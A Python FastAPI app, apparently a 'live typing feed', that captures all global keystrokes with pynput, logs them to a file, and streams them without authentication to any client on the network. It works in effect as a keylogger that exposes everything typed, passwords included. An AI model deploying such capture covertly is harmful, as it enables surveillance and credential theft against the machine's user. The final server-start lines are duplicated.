import asyncio
import json
import os
import threading
import time
from collections import deque
from contextlib import asynccontextmanager
from typing import Deque, Dict

from fastapi import FastAPI, Request
from fastapi.responses import FileResponse, JSONResponse, StreamingResponse
from pydantic import BaseModel
from pynput.keyboard import Key, KeyCode, Listener

MESSAGE_GAP_MS = 1200
MAX_MESSAGES = 200
messages: Deque[Dict[str, object]] = deque(maxlen=MAX_MESSAGES)
message_buffer = ""
last_key_time_ms = None
message_started_ms = None
active_modifiers = set()
listener: Listener | None = None

SHIFTED_SYMBOLS = {
    "1": "!",
    "2": "@",
    "3": "#",
    "4": "$",
    "5": "%",
    "6": "^",
    "7": "&",
    "8": "*",
    "9": "(",
    "0": ")",
    "-": "_",
    "=": "+",
    "[": "{",
    "]": "}",
    "\\": "|",
    ";": ":",
    "'": '"',
    ",": "<",
    ".": ">",
    "/": "?",
    "`": "~",
}


def normalize_key(key, modifiers=None):
    modifiers = modifiers or set()

    if key in (Key.shift, Key.shift_l, Key.shift_r):
        return ""
    if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
        return ""
    if key in (Key.alt, Key.alt_l, Key.alt_r):
        return ""
    if key in (Key.cmd, Key.cmd_l, Key.cmd_r):
        return ""
    if key == Key.space:
        return " "
    if key == Key.enter:
        return "\n"
    if key == Key.tab:
        return "\t"
    if key == Key.backspace:
        return "\b"

    if isinstance(key, KeyCode) and key.char is not None:
        ch = key.char
        if Key.shift in modifiers and ch.isalpha():
            ch = ch.upper()
        elif Key.shift in modifiers and ch in SHIFTED_SYMBOLS:
            ch = SHIFTED_SYMBOLS[ch]
        return ch

    return ""


def should_start_new_bubble(last_time, current_time_ms):
    if last_time is None:
        return False
    return (current_time_ms - last_time) >= MESSAGE_GAP_MS


def load_text_messages():
    global messages
    try:
        with open("text.txt", "r", encoding="utf-8") as f:
            lines = [line.strip() for line in f.read().splitlines() if line.strip()]
    except FileNotFoundError:
        return

    parsed = []
    for line in lines:
        if "|" not in line:
            continue
        ts, text = line.split("|", 1)
        try:
            parsed.append({"id": int(ts), "text": text.strip(), "time": int(ts)})
        except ValueError:
            continue
    messages = deque(parsed[-MAX_MESSAGES:], maxlen=MAX_MESSAGES)


def write_text_log():
    line_text = "\n".join(
        f"{int(item['time'])}|{item['text']}" for item in list(messages)
    )
    with open("text.txt", "w", encoding="utf-8") as f:
        f.write(line_text)


def flush_message_buffer():
    global message_buffer, last_key_time_ms, message_started_ms

    if not message_buffer:
        return

    text = message_buffer.strip()
    if not text:
        message_buffer = ""
        last_key_time_ms = None
        message_started_ms = None
        return

    payload = {
        "id": int(message_started_ms or time.time() * 1000),
        "text": text,
        "time": int(message_started_ms or time.time() * 1000),
    }
    messages.append(payload)
    write_text_log()
    message_buffer = ""
    last_key_time_ms = None
    message_started_ms = None


def on_press(key):
    global message_buffer, last_key_time_ms, message_started_ms

    if key in (Key.shift, Key.shift_l, Key.shift_r):
        active_modifiers.add(Key.shift)
        return
    if key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
        active_modifiers.add(Key.ctrl)
        return
    if key in (Key.alt, Key.alt_l, Key.alt_r):
        active_modifiers.add(Key.alt)
        return
    if key in (Key.cmd, Key.cmd_l, Key.cmd_r):
        active_modifiers.add(Key.cmd)
        return

    symbol = normalize_key(key, active_modifiers)
    if not symbol:
        return

    now_ms = time.time() * 1000

    if symbol == "\b":
        if message_buffer:
            message_buffer = message_buffer[:-1]
        if last_key_time_ms is not None:
            last_key_time_ms = now_ms
        return

    if symbol == "\n":
        flush_message_buffer()
        return

    if message_buffer and should_start_new_bubble(last_key_time_ms, now_ms):
        flush_message_buffer()

    if message_started_ms is None:
        message_started_ms = now_ms

    message_buffer += symbol
    last_key_time_ms = now_ms


def on_release(key):
    if key in (Key.shift, Key.shift_l, Key.shift_r):
        active_modifiers.discard(Key.shift)
    elif key in (Key.ctrl, Key.ctrl_l, Key.ctrl_r):
        active_modifiers.discard(Key.ctrl)
    elif key in (Key.alt, Key.alt_l, Key.alt_r):
        active_modifiers.discard(Key.alt)
    elif key in (Key.cmd, Key.cmd_l, Key.cmd_r):
        active_modifiers.discard(Key.cmd)


class MessageInput(BaseModel):
    text: str


@asynccontextmanager
async def lifespan(app: FastAPI):
    global listener
    load_text_messages()
    listener = Listener(on_press=on_press, on_release=on_release)
    listener.start()
    try:
        yield
    finally:
        if listener is not None and listener.is_alive():
            listener.stop()
            listener.join(timeout=1)


app = FastAPI(title="Live Key Feed", lifespan=lifespan)


@app.get("/")
async def root():
    return FileResponse("index.html")


@app.get("/messages")
async def fetch_messages():
    return JSONResponse(list(messages))


@app.post("/api/messages")
async def add_message(payload: MessageInput):
    text = payload.text.strip()
    if not text:
        return JSONResponse({"ok": False, "error": "empty message"})

    item = {"id": int(time.time() * 1000), "text": text, "time": int(time.time() * 1000)}
    messages.append(item)
    write_text_log()
    return JSONResponse({"ok": True, "message": item})


@app.get("/events")
async def events(request: Request):
    async def event_generator():
        last_seen = max((int(item["id"]) for item in messages), default=0)
        while True:
            for msg in list(messages):
                msg_id = int(msg["id"])
                if msg_id > last_seen:
                    yield f"data: {json.dumps(msg)}\n\n"
                    last_seen = msg_id
            if await request.is_disconnected():
                break
            await asyncio.sleep(0.5)

    return StreamingResponse(event_generator(), media_type="text/event-stream")


@app.get("/health")
async def health():
    return {"ok": True, "count": len(messages)}


if __name__ == "__main__":
    import uvicorn

    port = int(os.getenv("PORT", "8000"))
    uvicorn.run("app:app", host="0.0.0.0", port=port, reload=False)

    port = int(os.getenv("PORT", "8000"))
    uvicorn.run("app:app", host="0.0.0.0", port=port, reload=False)
